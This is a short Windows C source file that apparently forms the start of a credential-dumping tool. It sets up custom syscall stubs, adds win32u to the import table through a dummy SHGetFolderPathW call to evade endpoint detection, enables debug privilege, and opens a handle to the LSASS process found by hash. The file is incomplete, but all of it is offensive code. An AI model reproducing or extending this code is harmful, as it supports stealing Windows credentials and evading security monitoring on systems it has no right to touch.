#include <stdio.h>
#include <shlobj.h>

#include "Syscalls.h"
#include "GetProc.h"

#pragma comment (lib, "shell32.lib")

SYSCALL_API g_SyscallApi = { 0 };

VOID AddWin32uToIat() {

    WCHAR szPath[MAX_PATH] = { 0 };
    SHGetFolderPathW(NULL, CSIDL_MYVIDEO, NULL, NULL, szPath);
}

int main() {
    PVOID*   ppInstAddr  = NULL;
    BOOL     bResult     = FALSE;
    NTSTATUS ntStatus    = 0;
    HANDLE   hProc       = NULL;

    AddWin32uToIat();
    bResult = InitSyscalls(&g_SyscallApi);
    printf("%d\n", bResult);

    bResult = SetDebugPriv();
    printf("%d\n", bResult);

    ntStatus = GetProcHandle(lsassHash, hProc);
    if (!NT_SUCCESS(ntStatus)) {
        return 1;
    }

    printf("%d\n", bResult);
    return 0;
}
